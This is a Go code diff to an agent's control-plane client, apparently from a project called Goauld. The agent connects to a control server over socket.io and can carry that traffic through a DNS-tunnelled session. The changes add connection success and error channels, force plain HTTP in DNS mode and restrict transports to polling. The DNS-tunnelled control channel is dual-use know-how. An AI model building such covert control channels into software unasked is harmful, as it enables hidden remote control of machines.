@@ -6,6 +6,7 @@ import (
 	"errors"
 	"fmt"
 	"github.com/xtaci/smux"
+	"strings"
 	"time"
 
 	"Goauld/agent/config"
@@ -41,13 +42,15 @@ func NewControlPlanClient(ctx context.Context, configDone chan<- struct{}, cance
 	}
 }
 
-func (cpc *ControlPlanClient) Init() error {
+func (cpc *ControlPlanClient) Init(success chan struct{}, chanErr chan error) error {
 	cfg := getEioConfig()
-	return cpc.init(cfg)
+	return cpc.init(cfg, success, chanErr)
 }
 
-func (cpc *ControlPlanClient) InitOverDns(session *smux.Stream) error {
+func (cpc *ControlPlanClient) InitOverDns(session *smux.Stream, success chan struct{}, chanErr chan error) error {
 	_, err := session.Write([]byte(config.Get().Id))
+	// DNS MODE means we are using http, to simplify the exchanges
+	cpc.url = fmt.Sprintf("http://%s", strings.TrimPrefix(config.Get().SocketIoUrl(), "https://"))
 	if err != nil {
 		return fmt.Errorf("error writing id to DNS tunnelled session: %v", err)
 	}
@@ -56,22 +59,23 @@ func (cpc *ControlPlanClient) InitOverDns(session *smux.Stream) error {
 		return fmt.Errorf("error writing id to DNS tunnelled session: %v", err)
 	}
 	cfg := getDnsEioConfig(session)
-	return cpc.init(cfg)
+	return cpc.init(cfg, success, chanErr)
 }
 
 // Init initialize the socket.io handlers
-func (cpc *ControlPlanClient) init(cfg *sio.ManagerConfig) error {
+func (cpc *ControlPlanClient) init(cfg *sio.ManagerConfig, success chan struct{}, chanErr chan error) error {
 	manager := sio.NewManager(cpc.url, cfg)
 	socket := manager.Socket("/", nil)
 
 	socket.OnConnect(func() {
 		log.Trace().Msg("OnConnect")
 		log.Info().Msgf("Connected to the control server %s", cpc.url)
+		success <- struct{}{}
 	})
 	socket.OnConnectError(func(err any) {
 		log.Trace().Msg("OnConnectError")
 		log.Error().Msgf("Error occured connecting to %s (%v)", cpc.url, err)
-		cpc.canceler.Restart()
+		chanErr <- fmt.Errorf("error connecting to %s (%v)", cpc.url, err)
 	})
 
 	manager.OnError(func(err error) {
@@ -276,7 +280,7 @@ func getEioConfig() *sio.ManagerConfig {
 			WebTransportDialer: &webtransport.Dialer{
 				TLSClientConfig: proxy.NewTlsConfig(),
 			},
-			Transports: []string{"polling", "websocket", "webtransport"},
+			Transports: []string{"polling"}, //, "websocket", "webtransport"},
 			// Debugger:   sio.NewPrintDebugger(),
 		},
 	}
